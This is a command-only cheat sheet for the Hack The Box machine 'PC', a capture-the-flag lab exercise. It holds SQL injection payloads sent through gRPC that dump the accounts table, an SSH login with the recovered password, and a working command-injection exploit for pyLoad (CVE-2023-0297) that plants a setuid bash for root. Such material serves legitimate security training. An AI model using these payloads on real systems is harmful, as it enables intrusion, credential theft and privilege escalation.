# 💻 HTB: PC – Command Notes

## 🧭 Recon

### Nmap Scan
```bash
nmap -p- --min-rate 10000 10.10.11.214
nmap -p 22,50051 -sCV 10.10.11.214
```

### Check Unknown Port (TCP 50051)
```bash
nc 10.10.11.214 50051
```

---

## 📡 gRPC Enumeration

### Install grpcurl (if needed)
```bash
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest
```

### Basic Enumeration
```bash
grpcurl -plaintext 10.10.11.214:50051 list
grpcurl -plaintext 10.10.11.214:50051 list SimpleApp
grpcurl -plaintext 10.10.11.214:50051 describe SimpleApp
grpcurl -plaintext 10.10.11.214:50051 describe .LoginUserRequest
grpcurl -plaintext 10.10.11.214:50051 describe .getInfoRequest
```

---

## 👤 User Enumeration & Exploitation

### Register & Login
```bash
grpcurl -d 'username: "0xdf", password: "0xdf0xdf"' -plaintext -format text 10.10.11.214:50051 SimpleApp.RegisterUser
grpcurl -v -d 'username: "0xdf", password: "0xdf0xdf"' -plaintext -format text 10.10.11.214:50051 SimpleApp.LoginUser
```

### Store and Use Token
```bash
export TOKEN=<token_from_login>
grpcurl -d 'id: "54"' -H "token: $TOKEN" -plaintext -format text 10.10.11.214:50051 SimpleApp.getInfo
```

---

## 🩻 SQLi via gRPC

### Check SQLi with `union select`
```bash
grpcurl -d 'id: "320 union select 1"' -H "token: $TOKEN" -plaintext -format text 10.10.11.214:50051 SimpleApp.getInfo
```

### Identify DBMS
```bash
grpcurl -d 'id: "320 union select sqlite_version()"' -H "token: $TOKEN" -plaintext -format text 10.10.11.214:50051 SimpleApp.getInfo
```

### Get Tables
```bash
grpcurl -d 'id: "320 union select group_concat(tbl_name) from sqlite_master where type=\"table\" and tbl_name NOT LIKE \"sqlite_%\""' -H "token: $TOKEN" -plaintext -format text 10.10.11.214:50051 SimpleApp.getInfo
```

### Get Table Structure
```bash
grpcurl -d 'id: "320 union select group_concat(sql) from sqlite_master where type!=\"meta\" and sql NOT NULL"' -H "token: $TOKEN" -plaintext -format text 10.10.11.214:50051 SimpleApp.getInfo
```

### Extract Data from `accounts` Table
```bash
grpcurl -d 'id: "320 union select group_concat(username || \":\" || password ) from accounts"' -H "token: $TOKEN" -plaintext -format text 10.10.11.214:50051 SimpleApp.getInfo
```

---

## 🐚 Shell as sau

### [SSH](SSH) Login
```bash
sshpass -p 'HereIsYourPassWord1431' ssh sau@10.10.11.214
```

---

## 🚀 Privilege Escalation via PyLoad (CVE-2023-0297)

### Confirm Local Web Access
```bash
curl localhost:9666
curl localhost:8000
```

### SSH Port Forwarding
```bash
sshpass -p 'HereIsYourPassWord1431' ssh sau@10.10.11.214 -L 9666:localhost:9666 -L 8000:localhost:8000
```

### Exploit POC (CVE-2023-0297)
```bash
curl -d 'jk=pyimport os;os.system("touch /tmp/0xdf");f=function f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' http://127.0.0.1:9666/flash/addcrypted2
```

### Root Shell via SetUID Bash
```bash
curl -d 'jk=pyimport os;os.system("cp /bin/bash /tmp/0xdf; chmod 6777 /tmp/0xdf");f=function f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' http://127.0.0.1:9666/flash/addcrypted2
/tmp/0xdf -p
```

---

## 🔬 Beyond Root – App Inspection

### App Location
```bash
cd /opt/app
ls
```

### Files
- `app.proto`: GRPC proto definitions
- `app.py`: GRPC service implementation
- `sqlite.db`: backend database